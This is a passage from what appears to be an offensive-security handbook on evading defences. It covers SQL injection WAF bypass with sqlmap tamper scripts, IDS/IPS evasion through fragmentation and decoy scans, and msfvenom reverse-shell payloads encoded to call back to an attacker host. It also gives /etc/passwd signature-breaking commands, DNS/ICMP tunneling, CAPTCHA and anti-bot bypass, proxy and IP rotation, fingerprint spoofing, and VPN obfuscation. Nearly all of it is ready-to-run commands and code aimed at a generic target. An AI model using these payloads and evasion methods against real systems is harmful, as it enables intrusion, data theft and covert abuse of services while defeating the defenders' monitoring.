' OR 1=1--%00
```

**Using scientific notation:**

```bash
# Instead of numbers
1 -> 1e0 -> 1.0
0 -> 0e1
```

**Chunk encoding (HTTP Request Smuggling context):**

```bash
# Split payload across chunked transfer encoding
printf "3\r\n' O\r\n4\r\nR 1=\r\n2\r\n1-\r\n0\r\n\r\n" | nc target.com 80
```

### Advanced Bypass Tools

**Using sqlmap with tamper scripts:**

```bash
# List available tamper scripts
sqlmap --list-tampers

# Common WAF bypass combinations
sqlmap -u "https://target.com?id=1" --tamper=space2comment
sqlmap -u "https://target.com?id=1" --tamper=between,randomcase
sqlmap -u "https://target.com?id=1" --tamper=charencode,space2comment

# Cloudflare bypass
sqlmap -u "https://target.com?id=1" --tamper=space2comment,between

# ModSecurity bypass
sqlmap -u "https://target.com?id=1" --tamper=space2comment,charencode
```

**Custom tamper script creation:**

```python
#!/usr/bin/env python
# Save as custom_tamper.py in sqlmap/tamper directory

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Custom encoding: replaces space with /**/ and randomizes case
    """
    if payload:
        payload = payload.replace(" ", "/**/")
        # Randomize case implementation here
    return payload
```

**Burp Suite extensions for WAF bypass:**

- Bypass WAF extension (community)
- Hackvertor for encoding chains
- Custom Intruder payloads with encoding

**WAF bypass testing workflow:**

```bash
# 1. Identify WAF
wafw00f https://target.com

# 2. Test baseline blocked payload
curl "https://target.com?id=1' OR 1=1--" -v

# 3. Iterate through bypass techniques
for encoding in url double-url unicode html; do
  # Apply encoding and test
done

# 4. Use automated tools with tamper scripts
sqlmap -u "https://target.com?id=1" --level=5 --risk=3 \
  --tamper=space2comment,between,randomcase
```

---

## IDS/IPS Evasion

### Traffic Fragmentation

**TCP fragmentation:**

```bash
# nmap with fragmented packets
nmap -f target.com  # 8-byte fragments
nmap -ff target.com  # 16-byte fragments
nmap --mtu 24 target.com  # Custom MTU (must be multiple of 8)

# Using hping3
hping3 -S -p 80 -f target.com  # Fragmented SYN packets
```

**IP fragmentation:**

```bash
# fragroute for custom fragmentation
echo "ip_frag 24" > fragmentation.conf
fragroute -f fragmentation.conf target.com

# Using scapy
from scapy.all import *
packet = IP(dst="target.com")/TCP(dport=80,flags="S")
frags = fragment(packet, fragsize=8)
send(frags)
```

### Timing and Rate Evasion

**Slow scanning:**

```bash
# nmap timing templates (T0 = paranoid, T1 = sneaky)
nmap -T0 target.com  # Waits 5 minutes between probes
nmap -T1 target.com  # Waits 15 seconds between probes
nmap -T2 target.com  # Polite, waits 0.4 seconds

# Custom inter-packet delay
nmap --scan-delay 5s target.com
nmap --max-rate 1 target.com  # 1 packet per second
```

**Distributed scanning:**

```bash
# Split scan across multiple sources/times
# Day 1: Scan ports 1-1000 from IP A
# Day 2: Scan ports 1001-2000 from IP B
# Avoids threshold-based detection
```

### Protocol-Level Evasion

**TTL manipulation:**

```bash
# Set low TTL to expire before IDS but reach target
hping3 -S -p 80 -t 5 target.com

# TTL that expires at IDS but not target (requires topology knowledge)
```

**Invalid TCP flags:**

```bash
# FIN scan (stealthy, no connection established)
nmap -sF target.com

# NULL scan
nmap -sN target.com

# Xmas scan
nmap -sX target.com

# Using hping3 with custom flags
hping3 -S -F -P -U target.com -p 80
```

**TCP timestamp manipulation:**

```bash
# Nmap with bad checksums (some IDS drop these)
nmap --badsum target.com
```

**Decoy scanning:**

```bash
# Generate decoy traffic
nmap -D RND:10 target.com  # 10 random decoys
nmap -D decoy1,decoy2,ME,decoy3 target.com  # Specific decoys

# Idle/Zombie scan (advanced)
nmap -sI zombie_host target.com
```

### Payload Obfuscation

**Polymorphic shellcode:**

```bash
# Using msfvenom encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Multiple encoding iterations
msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker LPORT=4444 \
  -e x86/shikata_ga_nai -i 20 -f elf -o payload
```

**Encoding web payloads:**

```python
# Python script for multi-layer encoding
import base64
import urllib.parse

payload = "'; DROP TABLE users--"

# Layer 1: URL encode
encoded = urllib.parse.quote(payload)

# Layer 2: Base64
encoded = base64.b64encode(encoded.encode()).decode()

# Layer 3: Hex
encoded = encoded.encode().hex()
```

**Breaking signature patterns:**

```bash
# Instead of /etc/passwd
/e?c/p?s?wd
/etc/./passwd
/etc/passwd%00
/etc/../etc/passwd

# Command substitution to break patterns
cat</etc/passwd
cat</e'tc'/passwd
cat</etc/p''asswd
```

### DNS Tunneling (IDS Blind Spot)

**Using iodine:**

```bash
# Server side
iodined -f -c -P password 10.0.0.1 tunnel.domain.com

# Client side
iodine -f -P password tunnel.domain.com
```

**Using dnscat2:**

```bash
# Server
ruby dnscat2.rb tunnel.domain.com

# Client
./dnscat tunnel.domain.com
```

### ICMP Tunneling

**Using ptunnel:**

```bash
# Server
ptunnel -x password

# Client
ptunnel -p server_ip -lp 8000 -da destination -dp 80 -x password
```

### Encryption and Tunneling

**SSH tunneling to evade content inspection:**

```bash
# Local port forward through SSH
ssh -L 8080:target.com:80 user@pivot_host

# Dynamic SOCKS proxy
ssh -D 9050 user@pivot_host
# Configure tools to use SOCKS5 proxy localhost:9050
```

**Using Tor for anonymity:**

```bash
# Install and start Tor
service tor start

# Use proxychains with any tool
proxychains nmap -sT -Pn target.com
proxychains curl https://target.com
```

**HTTP/HTTPS tunneling:**

```bash
# Using corkscrew through HTTP proxy
ssh -o "ProxyCommand corkscrew proxy.server 8080 %h %p" user@target

# Using stunnel for TLS wrapping
# stunnel.conf
[ssh]
client = yes
accept = 127.0.0.1:2222
connect = target.com:22
```

### IDS Evasion Testing Tools

**Snort rule testing:**

```bash
# Use tcpreplay to replay captures
tcpreplay --intf1=eth0 --mbps=10 capture.pcap

# Split traffic across time
tcpreplay --intf1=eth0 --pps=1 capture.pcap
```

**Fragrouter (traffic manipulation):**

```bash
fragrouter -B1  # Fragment packets
fragrouter -B2  # Fragment packets with ordering
```

---

## Anti-Bot Detection Bypass

### Bot Detection Mechanisms

**Common detection signals:**

- User-Agent strings (automated tools often use distinctive UAs)
- TLS fingerprinting (cipher suites, extensions order)
- HTTP/2 fingerprinting
- JavaScript challenge execution
- Mouse movement and timing patterns
- Browser fingerprinting (Canvas, WebGL, fonts)
- Cookie handling
- Request timing and patterns
- IP reputation

### User-Agent Rotation

**Using curl with custom User-Agent:**

```bash
# Current popular browsers
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" https://target.com

curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0" https://target.com

curl -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15" https://target.com
```

**User-Agent rotation in Python:**

```python
import requests
from fake_useragent import UserAgent

ua = UserAgent()

headers = {'User-Agent': ua.random}
response = requests.get('https://target.com', headers=headers)

# Or cycle through specific browsers
browsers = [ua.chrome, ua.firefox, ua.safari]
```

**sqlmap with random User-Agent:**

```bash
sqlmap -u "https://target.com?id=1" --random-agent
```

### Headless Browser Detection Bypass

**Puppeteer stealth plugin:**

```javascript
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

puppeteer.use(StealthPlugin());

(async () => {
  const browser = await puppeteer.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  });
  
  const page = await browser.newPage();
  
  // Set realistic viewport
  await page.setViewport({ width: 1920, height: 1080 });
  
  // Modify navigator.webdriver
  await page.evaluateOnNewDocument(() => {
    Object.defineProperty(navigator, 'webdriver', {
      get: () => undefined
    });
  });
  
  await page.goto('https://target.com');
})();
```

**Selenium with undetected-chromedriver:**

```python
import undetected_chromedriver as uc

options = uc.ChromeOptions()
options.add_argument('--disable-blink-features=AutomationControlled')

driver = uc.Chrome(options=options)
driver.get('https://target.com')
```

**Playwright stealth:**

```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(
        headless=True,
        args=['--disable-blink-features=AutomationControlled']
    )
    
    context = browser.new_context(
        viewport={'width': 1920, 'height': 1080},
        user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    )
    
    page = context.new_page()
    
    # Inject scripts to hide automation
    page.add_init_script("""
        Object.defineProperty(navigator, 'webdriver', {
            get: () => undefined
        });
    """)
    
    page.goto('https://target.com')
```

### JavaScript Challenge Bypass

**Using requests + js2py (simple challenges):**

```python
import requests
import js2py

session = requests.Session()
response = session.get('https://target.com')

# Extract JavaScript challenge
js_challenge = extract_js_from_response(response.text)

# Execute JavaScript
context = js2py.EvalJs()
result = context.eval(js_challenge)

# Submit result
session.get(f'https://target.com/verify?result={result}')
```

**Using Selenium for dynamic challenges:**

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

driver = webdriver.Chrome()
driver.get('https://target.com')

# Wait for challenge to complete
WebDriverWait(driver, 10).until(
    EC.presence_of_element_located((By.ID, "content"))
)

# Extract cookies after challenge
cookies = driver.get_cookies()
```

### CAPTCHA Bypass

**[Unverified] Third-party CAPTCHA solving services:**

- 2Captcha API integration
- Anti-Captcha service
- DeathByCaptcha

[Inference] These services use human workers or machine learning models to solve CAPTCHAs, but their effectiveness depends on CAPTCHA type and implementation.

**Using 2Captcha API (example):**

```python
import requests

API_KEY = 'your_api_key'

# Submit CAPTCHA
response = requests.post('http://2captcha.com/in.php', data={
    'key': API_KEY,
    'method': 'userrecaptcha',
    'googlekey': 'site_key_from_page',
    'pageurl': 'https://target.com'
})

captcha_id = response.text.split('|')[1]

# Poll for solution
import time
time.sleep(20)

solution = requests.get(f'http://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}')
token = solution.text.split('|')[1]

# Submit form with token
```

### TLS Fingerprinting Bypass

**Using curl with specific cipher suites:**

```bash
# Mimic Chrome TLS fingerprint
curl --ciphers "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384" \
  --tlsv1.2 https://target.com

# Custom TLS configuration
curl --tls-max 1.3 --ciphers "TLS_AES_128_GCM_SHA256" https://target.com
```

**Using tls-client library (Python):**

```python
import tls_client

# Creates session with Chrome browser fingerprint
session = tls_client.Session(
    client_identifier="chrome_110",
    random_tls_extension_order=True
)

response = session.get('https://target.com')
```

### Request Timing and Patterns

**Adding human-like delays:**

```python
import time
import random

def human_delay():
    time.sleep(random.uniform(1, 3))

# Between requests
requests.get('https://target.com/page1')
human_delay()
requests.get('https://target.com/page2')
human_delay()
```

**Varying request patterns:**

```python
# Don't access pages in sequential order
pages = ['page1', 'page2', 'page3', 'page4']
random.shuffle(pages)

for page in pages:
    requests.get(f'https://target.com/{page}')
    time.sleep(random.uniform(2, 5))
```

### Cookie and Session Handling

**Maintaining session cookies:**

```python
import requests

session = requests.Session()

# Initial request to get cookies
session.get('https://target.com')

# Subsequent requests maintain cookies automatically
session.get('https://target.com/protected')
```

**Cookie manipulation:**

```bash
# Using curl with cookies
curl -c cookies.txt https://target.com  # Save cookies
curl -b cookies.txt https://target.com/protected  # Use cookies

# Modify cookies manually if needed
```

### IP Rotation and Proxies

**Using proxy rotation:**

```python
import requests

proxies = [
    'http://proxy1:8080',
    'http://proxy2:8080',
    'http://proxy3:8080'
]

for proxy in proxies:
    try:
        response = requests.get(
            'https://target.com',
            proxies={'http': proxy, 'https': proxy},
            timeout=5
        )
    except:
        continue
```

**Using Tor with stem (Python):**

```python
from stem import Signal
from stem.control import Controller
import requests

def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='your_password')
        controller.signal(Signal.NEWNYM)

session = requests.Session()
session.proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

# Rotate IP between requests
for i in range(10):
    session.get('https://target.com')
    renew_tor_ip()
    time.sleep(5)
```

**Residential proxy networks:** [Unverified] Services like Bright Data, Oxylabs, and Smartproxy provide residential IP pools that appear as legitimate users to anti-bot systems.

### Browser Fingerprinting Mitigation

**Canvas fingerprinting bypass:**

```javascript
// Inject random noise into canvas
page.evaluateOnNewDocument(() => {
  const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
  HTMLCanvasElement.prototype.toDataURL = function(type) {
    // Add minimal random noise
    const context = this.getContext('2d');
    const imageData = context.getImageData(0, 0, this.width, this.height);
    for (let i = 0; i < imageData.data.length; i += 4) {
      imageData.data[i] += Math.random() * 0.1;
    }
    context.putImageData(imageData, 0, 0);
    return originalToDataURL.apply(this, arguments);
  };
});
```

**WebGL fingerprinting mitigation:**

```javascript
page.evaluateOnNewDocument(() => {
  const getParameter = WebGLRenderingContext.prototype.getParameter;
  WebGLRenderingContext.prototype.getParameter = function(parameter) {
    if (parameter === 37445) { // UNMASKED_VENDOR_WEBGL
      return 'Intel Inc.';
    }
    if (parameter === 37446) { // UNMASKED_RENDERER_WEBGL
      return 'Intel Iris OpenGL Engine';
    }
    return getParameter.call(this, parameter);
  };
});
```

### Rate Limiting Bypass

**Distributed requests:**

```python
# Use multiple accounts/API keys
api_keys = ['key1', 'key2', 'key3']
key_index = 0

for request in requests_to_make:
    headers = {'Authorization': f'Bearer {api_keys[key_index]}'}
    response = requests.get('https://target.com/api', headers=headers)
    
    key_index = (key_index + 1) % len(api_keys)
    time.sleep(1)
```

**Respect rate limits but maximize throughput:**

```python
import time

requests_per_minute = 60
delay = 60.0 / requests_per_minute

for url in urls:
    start = time.time()
    requests.get(url)
    
    elapsed = time.time() - start
    if elapsed < delay:
        time.sleep(delay - elapsed)
```

### Anti-Bot Testing Tools

**BotD (Bot Detection):**

```javascript
// JavaScript library to test bot detection
import { load } from '@fingerprintjs/botd'

load().then((botd) => {
  botd.detect().then((result) => {
    console.log(result.bot) // true/false
  })
})
```

**Testing bot detection:**

```bash
# Use curl in verbose mode
curl -v -A "Mozilla/5.0..." https://target.com

# Check for:
# - 403 Forbidden
# - Challenge pages
# - Unusual cookies set
# - JavaScript requirements
```

---

For comprehensive defense evasion, also study:

- **Payload Encoding & Obfuscation** - Deep dive into encoding chains and custom obfuscation techniques
- **Protocol Manipulation** - Advanced TCP/IP manipulation techniques
- **Anonymization Infrastructure** - VPNs, Tor, proxy chains configuration
- **Sandbox Detection & Evasion** - For malware/payload delivery contexts

---

## Proxy Detection Bypass

### Understanding Proxy Detection Methods

**Server-Side Proxy Detection Techniques**

**HTTP Header Analysis**

```bash
# Headers that reveal proxy usage:
X-Forwarded-For: 192.168.1.100
X-Forwarded-Host: original-host.com
X-Forwarded-Proto: https
Via: 1.1 proxy-server.com
Forwarded: for=192.168.1.100;proto=http

# Check what headers your request sends
curl -v http://target.com 2>&1 | grep -i "^>"
```

**IP Reputation Databases**

```bash
# Common proxy/VPN detection services check:
# - Known proxy IP ranges (commercial proxies)
# - Data center IPs vs. residential IPs
# - VPN provider IP blocks
# - Tor exit node lists
# - Cloud provider IP ranges (AWS, GCP, Azure)

# Check if your IP is flagged
curl http://ip-api.com/json/YOUR_IP
# Look for: "proxy": true, "hosting": true

# Alternative services:
# - IPHub.info
# - GetIPIntel.net
# - IPQualityScore.com
```

**WebRTC Leak Detection**

```javascript
// Websites can detect real IP via WebRTC
// Check for leaks at: browserleaks.com/webrtc

// WebRTC leaks local/public IP even through proxies
var pc = new RTCPeerConnection({iceServers:[]});
pc.createDataChannel('');
pc.createOffer().then(offer => pc.setLocalDescription(offer));
pc.onicecandidate = function(ice){
    if(ice && ice.candidate && ice.candidate.candidate){
        var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
        console.log('Leaked IP: ' + myIP);
    }
};
```

**DNS Leak Detection**

```bash
# DNS requests may bypass proxy
# Test at: dnsleaktest.com

# Check current DNS servers
cat /etc/resolv.conf  # Linux
ipconfig /all | findstr "DNS Servers"  # Windows

# Verify DNS goes through proxy
tcpdump -i any port 53  # Monitor DNS traffic
```

**Time Zone & System Fingerprinting**

```javascript
// Browser fingerprinting can detect inconsistencies
console.log(Intl.DateTimeFormat().resolvedOptions().timeZone);  // System timezone
console.log(navigator.language);  // Browser language
console.log(screen.width + "x" + screen.height);  // Screen resolution

// Inconsistencies between IP location and system settings raise flags
```

### Proxy Detection Bypass Techniques

**HTTP Header Sanitization**

**Removing Proxy Headers**

```bash
# Using curl with explicit header control
curl -H "X-Forwarded-For:" \
     -H "Via:" \
     -H "Forwarded:" \
     http://target.com

# Squid proxy configuration to strip headers
# /etc/squid/squid.conf
request_header_access X-Forwarded-For deny all
request_header_access Via deny all
request_header_access Forwarded deny all
reply_header_access X-Forwarded-For deny all
reply_header_access Via deny all
```

**Header Forgery**

```python
import requests

# Forge headers to appear as direct connection
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    # Explicitly exclude proxy headers
    'X-Forwarded-For': '',
    'Via': '',
    'Forwarded': ''
}

response = requests.get('http://target.com', headers=headers, proxies={'http': 'http://proxy:8080'})
```

**Residential Proxy Networks**

**Rotating Residential Proxies**

```python
# Using residential proxy services (commercial services provide legitimate IPs)
# [Unverified] Commercial services like Bright Data, Smartproxy, Oxylabs

import requests
import random

# Example residential proxy pool format
residential_proxies = [
    'http://user:pass@residential-proxy1.com:8080',
    'http://user:pass@residential-proxy2.com:8080',
    'http://user:pass@residential-proxy3.com:8080'
]

def get_random_proxy():
    return {'http': random.choice(residential_proxies)}

# Use different proxy for each request
for i in range(10):
    response = requests.get('http://target.com', proxies=get_random_proxy())
```

**Mobile Proxies**

```bash
# Mobile carrier IPs are less likely to be flagged
# [Inference] Mobile proxies rotate through real mobile carrier IPs
# Services use 4G/5G modems with dynamic IPs

# Example: 4G proxy rotation
# Requires: 4G modem + proxy software (e.g., 3proxy, tinyproxy)

# Basic setup with 4G modem
# 1. Connect 4G modem
# 2. Configure proxy software
# 3. Script to reconnect modem (new IP)

#!/bin/bash
# Reconnect 4G modem for new IP
echo "Disconnecting..."
nmcli con down mobile-connection
sleep 5
echo "Reconnecting..."
nmcli con up mobile-connection
sleep 10
NEW_IP=$(curl -s ifconfig.me)
echo "New IP: $NEW_IP"
```

**Proxy Chaining**

**Multi-Hop Proxy Configuration**

```bash
# Chain multiple proxies to obscure origin
# proxychains configuration: /etc/proxychains4.conf

# Dynamic chain (if one proxy fails, skip to next)
dynamic_chain

# Proxy list (each request goes through all)
[ProxyList]
socks5 192.168.1.10 1080
http 10.0.0.5 8080
socks4 172.16.0.3 1080

# Usage
proxychains4 curl http://target.com

# Each request: You -> SOCKS5 -> HTTP -> SOCKS4 -> Target
```

**Tor + VPN + Proxy Chain**

```bash
# Maximum anonymity chain
# You -> VPN -> Tor -> HTTP Proxy -> Target

# 1. Start VPN connection
openvpn --config vpn.ovpn

# 2. Configure Tor to use VPN
# /etc/tor/torrc
# (Tor automatically uses system network)

# 3. Chain Tor + additional proxy
# /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 9050  # Tor SOCKS proxy
http additional-proxy.com 8080

# 4. Use chain
proxychains4 curl http://target.com
```

### WebRTC Leak Prevention

**Browser-Level Mitigation**

**Firefox Configuration**

```javascript
// about:config settings
media.peerconnection.enabled = false  // Disable WebRTC entirely

// Or use stricter policy
media.peerconnection.ice.default_address_only = true
media.peerconnection.ice.no_host = true
media.peerconnection.ice.proxy_only_if_behind_proxy = true
```

**Chrome/Chromium Extensions**

```bash
# Install WebRTC leak prevention extensions:
# - WebRTC Leak Prevent
# - uBlock Origin (with WebRTC blocking)

# Command-line flag (disable WebRTC)
chromium --disable-webrtc

# Brave browser (built-in protection)
# Settings -> Shields -> Block WebRTC
```

**Programmatic WebRTC Blocking**

```javascript
// Override WebRTC objects in automation scripts
// For Selenium/Puppeteer

await page.evaluateOnNewDocument(() => {
    // Disable WebRTC
    window.RTCPeerConnection = undefined;
    window.RTCSessionDescription = undefined;
    window.RTCIceCandidate = undefined;
    navigator.getUserMedia = undefined;
    navigator.mediaDevices.getUserMedia = undefined;
});
```

### DNS Leak Prevention

**Forcing DNS Through Proxy**

**System-Level DNS Configuration**

```bash
# Linux: Use DNS over proxy
# Configure SOCKS proxy to handle DNS

# /etc/resolv.conf
nameserver 127.0.0.1  # Local DNS resolver

# DNSCrypt proxy configuration
# Forward DNS through encrypted channel
systemctl start dnscrypt-proxy

# Verify no DNS leaks
tcpdump -i any port 53  # Should show no external DNS
```

**Proxy-Aware DNS Tools**

```bash
# Using proxychains with DNS resolution
# /etc/proxychains.conf
proxy_dns  # Enable DNS proxying

# Now DNS goes through proxy chain
proxychains4 dig example.com

# Tor DNS resolution
torsocks curl http://target.com  # DNS resolved via Tor
```

**DNS over HTTPS (DoH)**

```bash
# Firefox: about:config
network.trr.mode = 2  # Enable DoH
network.trr.uri = https://mozilla.cloudflare-dns.com/dns-query

# System-level DoH (Linux)
# Using cloudflared
cloudflared proxy-dns --upstream https://1.1.1.1/dns-query

# Update /etc/resolv.conf
nameserver 127.0.0.1
```

### Geographic Consistency

**Matching System Settings to Proxy Location**

**Time Zone Spoofing**

```bash
# Linux: Change timezone
sudo timedatectl set-timezone America/New_York

# Verify
date +%Z

# Temporary change (doesn't require root)
export TZ="America/Los_Angeles"
```

**Browser Timezone Spoofing**

```javascript
// Override JavaScript timezone
// For automation scripts (Puppeteer/Selenium)

await page.evaluateOnNewDocument(() => {
    const originalDateTimeFormat = Intl.DateTimeFormat;
    Intl.DateTimeFormat = function(...args) {
        if (args.length === 0) {
            return new originalDateTimeFormat('en-US', { timeZone: 'America/New_York' });
        }
        return new originalDateTimeFormat(...args);
    };
});
```

**Language & Locale Settings**

```python
# Requests library with locale matching
import requests

headers = {
    'Accept-Language': 'en-US,en;q=0.9',  # Match proxy country
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...'
}

response = requests.get('http://target.com', headers=headers, proxies=proxies)
```

### Browser Fingerprint Consistency

**Canvas Fingerprint Spoofing**

```javascript
// Canvas fingerprinting defense
// Inject noise into canvas operations

const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
HTMLCanvasElement.prototype.toDataURL = function() {
    // Add slight noise to canvas data
    const context = this.getContext('2d');
    const imageData = context.getImageData(0, 0, this.width, this.height);
    
    // [Inference] Slight modifications prevent consistent fingerprinting
    for (let i = 0; i < imageData.data.length; i += 4) {
        imageData.data[i] += Math.floor(Math.random() * 3) - 1;
    }
    
    context.putImageData(imageData, 0, 0);
    return originalToDataURL.apply(this, arguments);
};
```

**Font Fingerprint Mitigation**

```javascript
// Limit font enumeration
// [Inference] Standardize fonts to common set

Object.defineProperty(navigator, 'fonts', {
    get: () => ({
        check: () => false,
        ready: Promise.resolve(),
        size: 50  // Report standard number
    })
});
```

### IP Reputation Management

**Testing IP Reputation**

```bash
# Check IP blacklist status
curl "http://api.stopforumspam.org/api?ip=YOUR_IP&json"

# Check multiple blacklists
dig YOUR_IP.bl.spamcop.net
dig YOUR_IP.zen.spamhaus.org

# [Inference] If IP is blacklisted, rotate to clean IP
```

**IP Warming for New Proxies**

```python
# Gradually increase request volume on new IPs
# [Inference] Sudden high traffic from new IP triggers flags

import time
import requests

def warm_up_ip(proxy, target_url):
    """Gradually increase traffic to appear legitimate"""
    
    # Day 1: Very low volume
    for i in range(5):
        requests.get(target_url, proxies={'http': proxy})
        time.sleep(3600)  # 1 hour between requests
    
    # Day 2: Slightly increase
    for i in range(10):
        requests.get(target_url, proxies={'http': proxy})
        time.sleep(1800)  # 30 min between requests
    
    # Day 3: Normal usage
    # ... continue pattern
```

### Commercial Proxy Services Comparison

|Service Type|Detection Rate|Cost|Ideal Use Case|
|---|---|---|---|
|**Datacenter Proxies**|High|Low|Speed-critical, low-security|
|**Residential Proxies**|Low|Medium-High|Web scraping, bot detection bypass|
|**Mobile Proxies**|Very Low|High|Maximum stealth, account creation|
|**Rotating Proxies**|Medium|Medium|Distributed requests, rate limit bypass|
|**Private Proxies**|Medium|Medium|Dedicated IPs, consistency needed|

---

## VPN and Anonymization

### VPN Technology Overview

**VPN Protocol Comparison**

**OpenVPN**

```bash
# Most widely supported, highly configurable
# TCP mode (more reliable, harder to detect)
openvpn --config client.ovpn --proto tcp

# UDP mode (faster, easier to block)
openvpn --config client.ovpn --proto udp

# Configuration options for stealth
# client.ovpn
proto tcp-client
port 443  # Use HTTPS port to blend in
cipher AES-256-GCM
auth SHA512
tls-auth ta.key 1  # Additional HMAC authentication
```

**WireGuard**

```bash
# Modern, fast, smaller codebase
# [Inference] Easier to audit, potentially more secure

# Installation
apt install wireguard

# Configuration: /etc/wireguard/wg0.conf
[Interface]
PrivateKey = YOUR_PRIVATE_KEY
Address = 10.0.0.2/24
DNS = 1.1.1.1

[Peer]
PublicKey = SERVER_PUBLIC_KEY
Endpoint = vpn-server.com:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25

# Start connection
wg-quick up wg0

# Verify
wg show
```

**IPSec/IKEv2**

```bash
# Native support on most OSes
# Strong encryption, good for mobile

# StrongSwan configuration (Linux)
# /etc/ipsec.conf
conn myvpn
    keyexchange=ikev2
    ike=aes256-sha2_256-modp2048!
    esp=aes256-sha2_256!
    dpdaction=restart
    dpddelay=30s
    right=vpn-server.com
    rightid=vpn-server.com
    rightsubnet=0.0.0.0/0
    rightauth=pubkey
    left=%any
    leftauth=eap-mschapv2
    leftsourceip=%config
    auto=start
```

### VPN Detection Methods

**Deep Packet Inspection (DPI)**

**OpenVPN Fingerprinting**

```bash
# OpenVPN has identifiable packet patterns
# Packet length sequences, timing characteristics

# [Inference] DPI systems can identify:
# - TLS handshake patterns unique to OpenVPN
# - Certificate common names
# - Packet size distribution

# Detection example (conceptual)
# First packet: 1500 bytes (certificate exchange)
# Second packet: 52 bytes (ACK)
# Third packet: 200-400 bytes (key material)
```

**Protocol Analysis**

```bash
# VPN traffic characteristics:
# - High volume of encrypted data
# - Consistent packet timing
# - Long-duration connections
# - Encrypted traffic to single endpoint

# Test if your VPN is detected
curl --interface tun0 http://whoer.net/api
# Check "vpn" field in JSON response
```

### VPN Detection Bypass

**Obfuscation Techniques**

**OpenVPN over SSL/TLS (Stunnel)**

```bash
# Wrap OpenVPN in TLS to appear as HTTPS

# Server: /etc/stunnel/stunnel.conf
[openvpn]
accept = 443
connect = 127.0.0.1:1194
cert = /etc/stunnel/stunnel.pem
key = /etc/stunnel/stunnel.key

# Client: /etc/stunnel/stunnel-client.conf
[openvpn]
client = yes
accept = 127.0.0.1:1194
connect = vpn-server.com:443
verify = 2
CAfile = /etc/stunnel/ca.crt

# Start stunnel
stunnel /etc/stunnel/stunnel-client.conf

# Connect OpenVPN to local stunnel
openvpn --config client.ovpn --remote 127.0.0.1 1194 --proto tcp
```

**Obfsproxy (Tor Obfuscation)**

```bash
# Makes traffic appear random/non-protocol-specific

# Install obfsproxy
apt install obfsproxy

# Server configuration
obfsproxy --log-min-severity=info obfs4 --dest=127.0.0.1:1194 server 0.0.0.0:9001

# Client configuration
obfsproxy --log-min-severity=info obfs4 --dest=vpn-server.com:9001 client 127.0.0.1:1194

# Connect through obfsproxy
openvpn --config client.ovpn --remote 127.0.0.1 1194
```

**Shadowsocks (Traffic Obfuscation)**

```bash
# SOCKS5 proxy with encryption and obfuscation

# Server installation
apt install shadowsocks-libev

# Server configuration: /etc/shadowsocks-libev/config.json
{
    "server":"0.0.0.0",
    "server_port":8388,
    "password":"your_password",
    "timeout":300,
    "method":"chacha20-ietf-poly1305",
    "mode":"tcp_and_udp"
}

# Start server
ss-server -c /etc/shadowsocks-libev/config.json

# Client usage
ss-local -s server_ip -p 8388 -l 1080 -k your_password -m chacha20-ietf-poly1305

# Route OpenVPN through Shadowsocks
# Set socks-proxy directive in OpenVPN config
socks-proxy 127.0.0.1 1080
```

**V2Ray/VMess Protocol**

```bash
# Modern protocol designed to evade DPI
# [Inference] Commonly used in countries with heavy censorship

# Installation
bash <(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh)

# Client configuration: /usr/local/etc/v2ray/config.json
{
  "inbounds": [{
    "port": 1080,
    "protocol": "socks",
    "settings": {"udp": true}
  }],
  "outbounds": [{
    "protocol": "vmess",
    "settings": {
      "vnext": [{
        "address": "server.com",
        "port": 443,
        "users": [{"id": "UUID", "alterId": 0}]
      }]
    },
    "streamSettings": {
      "network": "ws",
      "security": "tls",
      "wsSettings": {"path": "/path"}
    }
  }]
}

# Start V2Ray
systemctl start v2ray
```

### Multi-Hop VPN Configuration

**Nested VPN Connections**

```bash
# Connect to multiple VPNs sequentially
# Traffic path: You -> VPN1 -> VPN2 -> Target

# Start first VPN
openvpn --config vpn1.ovpn --dev tun0

# Once connected, start second VPN through first
# Configure routing to force second VPN through first
ip route add VPN2_SERVER_IP via VPN1_GATEWAY dev tun0

# Start second VPN
openvpn --config vpn2.ovpn --dev tun1

# Verify routing
traceroute target.com
```

**VPN + Tor Configuration**

```bash
# Two configurations:
# 1. VPN -> Tor (VPN sees your IP, exit node sees VPN)
# 2. Tor -> VPN (VPN sees Tor exit, your ISP sees Tor)

# Configuration 1: VPN -> Tor
# Connect to VPN first
openvpn --config vpn.ovpn

# Start Tor (automatically uses VPN connection)
systemctl start tor

